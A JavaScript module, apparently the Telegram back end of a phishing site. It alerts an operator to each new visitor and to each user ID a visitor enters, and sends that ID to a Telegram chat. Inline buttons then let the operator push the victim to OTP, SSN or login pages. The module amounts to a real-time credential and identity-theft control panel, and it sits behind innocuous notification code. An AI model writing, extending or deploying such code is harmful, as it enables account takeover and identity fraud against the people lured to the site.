// Telegram Bot Integration
// Sends notifications to Telegram and handles webhook commands

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Your Telegram user ID

// Send message to Telegram
export async function sendTelegramMessage(text, chatId = null, replyMarkup = null) {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('[telegram] Bot token not configured');
    return null;
  }

  const targetChatId = chatId || TELEGRAM_CHAT_ID;
  if (!targetChatId) {
    console.warn('[telegram] Chat ID not configured');
    console.warn('[telegram] TELEGRAM_CHAT_ID:', TELEGRAM_CHAT_ID);
    console.warn('[telegram] chatId parameter:', chatId);
    return null;
  }
  
  // Ensure chat ID is a string (Telegram API accepts both, but string is safer)
  const chatIdString = String(targetChatId).trim();
  if (!chatIdString) {
    console.error('[telegram] Chat ID is empty after conversion');
    return null;
  }
  
  // Check message length (Telegram limit is 4096 characters)
  if (text.length > 4096) {
    console.error('[telegram] Message too long:', text.length, 'characters (max 4096)');
    // Truncate message if too long
    text = text.substring(0, 4090) + '...';
    console.warn('[telegram] Message truncated to 4096 characters');
  }
  
  console.log('[telegram] Using chat ID:', chatIdString);
  console.log('[telegram] Message length:', text.length, 'characters');

  try {
    const payload = {
      chat_id: chatIdString,
      text: text,
      parse_mode: 'HTML'
    };
    
    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }

    console.log('[telegram] Sending message to Telegram API...');
    console.log('[telegram] Chat ID:', targetChatId);
    console.log('[telegram] Message length:', text.length);
    console.log('[telegram] Bot token preview:', TELEGRAM_BOT_TOKEN ? `${TELEGRAM_BOT_TOKEN.substring(0, 10)}...` : 'NOT SET');

    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    console.log('[telegram] API URL:', apiUrl.replace(TELEGRAM_BOT_TOKEN, 'TOKEN_HIDDEN'));

    console.log('[telegram] Making fetch request to Telegram API...');
    console.log('[telegram] Payload:', JSON.stringify({ ...payload, text: payload.text.substring(0, 100) + '...' }, null, 2));
    
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    console.log('[telegram] ========== TELEGRAM API RESPONSE ==========');
    console.log('[telegram] Response status:', response.status, response.statusText);
    console.log('[telegram] Response ok:', response.ok);
    console.log('[telegram] Response headers:', Object.fromEntries(response.headers.entries()));

    if (!response.ok) {
      const errorText = await response.text();
      console.error('[telegram] ❌ HTTP error response from Telegram API');
      console.error('[telegram] Status:', response.status, response.statusText);
      console.error('[telegram] Error text:', errorText);
      try {
        const errorData = JSON.parse(errorText);
        console.error('[telegram] Parsed error data:', JSON.stringify(errorData, null, 2));
        console.error('[telegram] Error code:', errorData.error_code);
        console.error('[telegram] Error description:', errorData.description);
      } catch (e) {
        console.error('[telegram] Could not parse error response as JSON');
        console.error('[telegram] Raw error:', errorText);
      }
      return null;
    }

    const responseText = await response.text();
    console.log('[telegram] Raw response text:', responseText);
    
    let data;
    try {
      data = JSON.parse(responseText);
    } catch (parseError) {
      console.error('[telegram] ❌ Failed to parse response as JSON:', parseError);
      console.error('[telegram] Response text:', responseText);
      return null;
    }

    console.log('[telegram] Telegram API response:', JSON.stringify(data, null, 2));
    
    if (data.ok) {
      console.log('[telegram] ✅ Message sent successfully to chat:', chatIdString);
      console.log('[telegram] Message ID:', data.result?.message_id);
      console.log('[telegram] Chat:', data.result?.chat);
      return data.result;
    } else {
      console.error('[telegram] ❌ Error sending message to Telegram API');
      console.error('[telegram] Full error response:', JSON.stringify(data, null, 2));
      console.error('[telegram] Error code:', data.error_code);
      console.error('[telegram] Error description:', data.description);
      console.error('[telegram] Parameters:', data.parameters);
      return null;
    }
  } catch (error) {
    console.error('[telegram] ❌ Exception sending message to Telegram:', error);
    console.error('[telegram] Error name:', error?.name);
    console.error('[telegram] Error message:', error?.message);
    console.error('[telegram] Error stack:', error?.stack);
    return null;
  }
}

// Send visitor notification with page selection buttons
export async function notifyVisitor(visitorId = null) {
  const visitorInfo = visitorId ? `\nVisitor ID: <code>${visitorId}</code>` : '';
  const message = `🔔 <b>NEW VISITOR ON SITE</b>${visitorInfo}\n\n` +
    `Time: ${new Date().toLocaleString()}\n\n` +
    `Select page to redirect:`;
  
  // Inline keyboard with buttons - INCLUDE VISITOR ID IN CALLBACK DATA
  // Format: redirect_otp_VISITORID, redirect_ssn_VISITORID, etc.
  const replyMarkup = {
    inline_keyboard: [
      [
        { text: 'OTP PAGE', callback_data: visitorId ? `redirect_otp_${visitorId}` : 'redirect_otp' },
        { text: 'SSN PAGE', callback_data: visitorId ? `redirect_ssn_${visitorId}` : 'redirect_ssn' }
      ],
      [
        { text: 'LOGIN PAGE', callback_data: visitorId ? `redirect_login_${visitorId}` : 'redirect_login' }
      ]
    ]
  };
  
  return await sendTelegramMessage(message, null, replyMarkup);
}

// Send notification about new activity
export async function notifyActivity(activity) {
  if (activity.type === 'userid') {
    const message = `🔔 <b>USER ID ENTERED</b>\n\n` +
      `User ID: <code>${activity.userId}</code>\n` +
      `Activity ID: <code>${activity.id}</code>\n` +
      `Time: ${new Date(activity.timestamp).toLocaleString()}\n\n` +
      `Select redirect page:`;
    
    // Inline keyboard with buttons for this specific activity
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: 'OTP PAGE', callback_data: `approve_otp_${activity.id}` },
          { text: 'SSN PAGE', callback_data: `approve_ssn_${activity.id}` }
        ],
        [
          { text: 'LOGIN PAGE', callback_data: `approve_login_${activity.id}` }
        ]
      ]
    };
    
    return await sendTelegramMessage(message, null, replyMarkup);
  }
  return null;
}


